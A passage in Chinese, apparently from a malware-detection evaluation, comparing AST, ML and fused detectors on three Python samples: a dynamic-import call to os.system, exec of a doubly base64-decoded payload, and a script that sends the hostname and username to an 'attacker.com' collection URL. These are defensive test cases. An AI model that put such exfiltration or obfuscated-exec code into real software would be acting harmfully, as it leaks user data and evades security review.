## 🔍 典型案例分析

### 案例 1: 未知变体 - 动态导入

**代码**:
```python
import importlib
os = importlib.import_module('os')
os.system('id')
```

**检测结果**:
- AST: ❌ 漏报 (未识别动态导入)
- ML: ✅ 检出 (置信度 0.98)
- 融合：✅ 检出 (风险评分 98.8)

**分析**: ML 通过特征 `suspicious_import_count` 和 `code_exec_score` 成功识别。

### 案例 2: 混淆代码 - 多层 Base64

**代码**:
```python
import base64
layer1 = "WkdzYkdWdVpHVnM="
layer2 = base64.b64decode(layer1).decode()
payload = base64.b64decode(layer2).decode()
exec(payload)
```

**检测结果**:
- AST: ❌ 漏报 (未识别嵌套解码)
- ML: ✅ 检出 (置信度 0.99)
- 融合：✅ 检出 (风险评分 99.6)

**分析**: ML 通过特征 `encoded_string_count` 和 `obfuscation_score` 成功识别。

### 案例 3: 0-day 攻击 - 新型数据外传

**代码**:
```python
import urllib.request
import getpass
import socket

hostname = socket.gethostname()
username = getpass.getuser()
data = f"{hostname}:{username}"
urllib.request.urlopen(f"http://attacker.com/collect?data={data}")
```

**检测结果**:
- AST: ✅ 检出 (识别网络 + 敏感信息)
- ML: ✅ 检出 (置信度 0.97)
- 融合：✅ 检出 (风险评分 98.8)

**分析**: AST 和 ML 都成功识别，融合决策增强置信度。
